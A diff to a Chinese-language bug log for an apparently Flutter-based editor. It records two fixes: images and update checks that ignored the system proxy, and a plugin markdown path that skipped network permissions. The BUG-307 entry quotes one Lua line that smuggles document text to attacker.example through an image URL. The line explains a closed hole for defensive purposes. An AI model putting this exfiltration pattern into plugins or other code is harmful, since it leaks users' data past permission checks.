@@ -48,6 +48,8 @@
 | BUG-303 | 2026-09-07 | 插件不申请 `network.request` 也能让宿主替它发出站请求 | P0 | 已修复 |
 | BUG-304 | 2026-09-07 | `PluginPermission.withImplied` 写好了没人调，`ui.webview` 不带网络 | P1 | 已修复 |
 | BUG-305 | 2026-09-07 | 权限清单里长句子横向溢出，最该读的那条读不到 | P1 | 已修复 |
+| BUG-306 | 2026-09-07 | 文档里的远程图片和更新检查不走系统代理，全局没有 `HttpOverrides` | P1 | 已修复 |
+| BUG-307 | 2026-09-07 | `markdown` 节点里的 `![](http://…)` 绕过权限、日志和代理 | P1 | 已修复 |
 
 ---
 
@@ -2352,3 +2354,102 @@ which can reach any server (the editor logs where)"，88 个字符。
 ### 涉及文件
 
 `lib/ui/screens/plugin_detail_view.dart`；`test/ui/screens/plugin_permissions_test.dart`
+
+---
+
+## BUG-306：`Image.network` 和 `package:http` 不走系统代理
+
+### 现象
+
+在代理后面（本项目作者的环境就是），文档里的 `![](https://…/pic.png)` 从来加载不出来，
+预览显示的是错误色的 `[alt 文本]`。**这看起来像链接坏了，而不像一个从没生效的设置。**
+更新检查同样静默失败。
+
+### 根因
+
+`ai_connection_service`、`ai_chat_service`、`plugin_catalog_service`、
+`plugin_image_loader` 四处都规规矩矩写了：
+
+```dart
+client.findProxy = (uri) => HttpClient.findProxyFromEnvironment(
+  uri, environment: Platform.environment);
+```
+
+dart:io 的 `HttpClient` **默认不读 `http_proxy`**，所以这行不是装饰。而剩下两个出站点
+根本没有调用点可以写这一行：
+
+- `Image.network` 的 `HttpClient` 建在 Flutter painting 层深处（`_network_image_io.dart`
+  的一个 static final）；
+- `package:http` 的建在 `IOClient` 里面。
+
+这正是 CLAUDE.md 里那条「一条规则被抄了好几份，其中一份没跟上」——只不过没跟上的两份
+**不是忘了抄，是抄不到**。
+
+### 修
+
+`HttpOverrides` 是唯一能一次盖住全部的地方：`HttpClient()` 是个工厂，它先问 overrides。
+`lib/core/net/system_proxy.dart` 里 40 行，`main()` 里一行装上。
+
+**启动开销为零**：设一个 zone 值，不开 socket、不读文件。所以它不出现在启动 trace 里,
+也不违反「秒启动」。
+
+`proxyFor` 做成公开方法，因为 `HttpClient.findProxy` 只有 setter 没有 getter，
+测试问不出一个 client 的决定。`no_proxy` 这条规则值得单独测——它最容易写错，
+而且只有在代理后面访问内网主机时才看得出来。
+
+原来那四处手写的 `findProxy` 保留不动：它们现在是和默认值一致，而不是唯一有代理的地方。
+
+### 变异
+
+把 `createHttpClient` 里的 `..findProxy = proxyFor` 拿掉：连接测试失败
+（假代理服务器没被访问）。另有一条守卫断言 `main.dart` 里确实有
+`HttpOverrides.global = SystemProxyHttpOverrides()`，**且在
+`WidgetsFlutterBinding.ensureInitialized()` 之前**——"写好了没装上"是本仓库第六次
+犯的错，一个从没赋值的 override 恰好以那种方式失败：单元测试全绿，运行时毫无变化。
+
+### 涉及文件
+
+`lib/core/net/system_proxy.dart`（新增）；`lib/main.dart`；
+`test/core/net/system_proxy_test.dart`（新增）
+
+---
+
+## BUG-307：`markdown` 节点是同一扇门的第二个把手
+
+### 现象
+
+BUG-303 把 `image` 节点挡在了 `network.request` 后面。但插件还有第二种画图片的写法：
+
+```lua
+sdk.ui.markdown("![](https://attacker.example/p.png?d=" .. text .. ")")
+```
+
+`PluginUiMarkdown` 直接交给 `MarkdownRenderer`，后者走 `Image.network`——
+**不查权限、不写日志、不走代理**（代理这一条已由 BUG-306 顺带解决）。
+
+修完 BUG-303 才发现它，因为修法本身提出了这个问题：一个插件还能从哪里发出请求？
+记忆里那条「改一个分支就读完它的兄弟」说的正是这个——横向读兄弟分支。
+
+### 修：一个载体，不是一个开关加一个载体
+
+第一反应是给 `MarkdownRenderer` 加个 `bool allowRemoteImages`。那样要把这个布尔值
+从 `plugin_command_actions` 一路穿过 sink typedef、tip provider、右侧边栏，五个文件。
+而且它只能"拒绝"，给不了日志和代理。
+
+改成传**加载器本身**：`MarkdownRenderer.loadImage`，可空。文档传 null，行为一字不变；
+插件传的正是 `image` 节点用的那个 `PluginImageLoader`——它已经检查权限、记主机名、走代理。
+**两种写法得到同一个答案**，而且只动两个文件。
+
+`_loadedPictures` 缓存把 `imageRevision` 折进了键：只用地址做键的话，
+「重新加载图片」会重建 FutureBuilder 然后把它正想丢掉的那份字节交回去。
+
+### 变异
+
+`PluginUiView` 不传 `loadImage`：「a remote one goes through the editor, not
+around it」失败（`Actual: []`）。另一条「a document is left alone」断言无加载器时
+仍然走老路——widget 测试里网络图片必然失败，显示的 alt 文本就是老路的证据。
+
+### 涉及文件
+
+`lib/ui/editor/markdown_renderer.dart`；`lib/ui/widgets/plugin_ui_view.dart`；
+`test/services/plugin_ui_test.dart`
